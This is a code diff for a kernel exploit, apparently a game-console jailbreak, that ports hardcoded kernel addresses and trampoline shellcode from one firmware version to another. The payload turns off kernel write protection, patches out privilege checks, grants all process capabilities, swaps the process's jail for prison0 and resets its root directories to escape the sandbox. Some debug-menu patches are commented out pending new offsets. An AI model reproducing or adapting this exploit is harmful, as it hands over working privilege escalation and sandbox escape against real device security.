@@ -23,7 +23,7 @@ void payload(struct knote *kn) {
 	asm volatile("mov %0, %%gs:0" : "=r"(td));
 
 	// Enable UART output
-	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833242F6;
+	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833DC96E;
 	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0
 
 	// Print test message to the UART line
@@ -33,12 +33,13 @@ void payload(struct knote *kn) {
 	uint64_t cr0 = readCr0();
 	writeCr0(cr0 & ~X86_CR0_WP);
 	
+	// ! needs adding 1.01 offsets
 	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
-	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
-	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
+	//*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
+	//*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
 	
-	*(char *)0xFFFFFFFF8332431A = 1;
-	*(char *)0xFFFFFFFF83324338 = 1;
+	//*(char *)0xFFFFFFFF8332431A = 1;
+	//*(char *)0xFFFFFFFF83324338 = 1;
 	
 	// Restore write protection
 	writeCr0(cr0);
@@ -66,17 +67,17 @@ void payload(struct knote *kn) {
 	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
 	*sceProcCap = 0xffffffffffffffff; // Sce Process
 	
-	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
-	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check
+	((uint64_t *)0xFFFFFFFF83384188)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
+	((uint64_t *)0xFFFFFFFF8324ACE8)[0] = 0; // bypass priv_check
 
 	// Jailbreak ;)
-	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0
+	cred->cr_prison = (void *)0xFFFFFFFF83244740; //&prison0
 
 	// Break out of the sandbox
 	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
 	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
 	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
-	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
+	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF833A7750;
 	*td_fdp_fd_rdir = *rootvnode;
 	*td_fdp_fd_jdir = *rootvnode;
 }
@@ -126,11 +127,12 @@ void *exploitThread(void *none) {
 	int writableHandle;
 	uint8_t trampolinecode[] = {
 		0x58, // pop rax
-		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
+		0x48, 0xB8, 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xFFFFFFFF82467D59 on 1.01 //0xFFFFFFFF82403919 1.76
 		0x50, // push rax
 		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
 		0xFF, 0xE0 // jmp rax
 	};
+
 
 	// Get Jit memory
 	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
@@ -257,9 +259,9 @@ int _main(void) {
 	
 	enable = 1;
 	size = sizeof(enable);
-	
-	sysctlbyname("machdep.rcmgr_utoken_store_mode", NULL, NULL, &enable, size);
-	sysctlbyname("machdep.rcmgr_debug_menu", NULL, NULL, &enable, size);
+	//! again needs fixing offsets for 1.01 in payload
+	//sysctlbyname("machdep.rcmgr_utoken_store_mode", NULL, NULL, &enable, size);
+	//sysctlbyname("machdep.rcmgr_debug_menu", NULL, NULL, &enable, size);
 	
 #ifdef DEBUG_SOCKET
 	munmap(dump, PAGE_SIZE);	
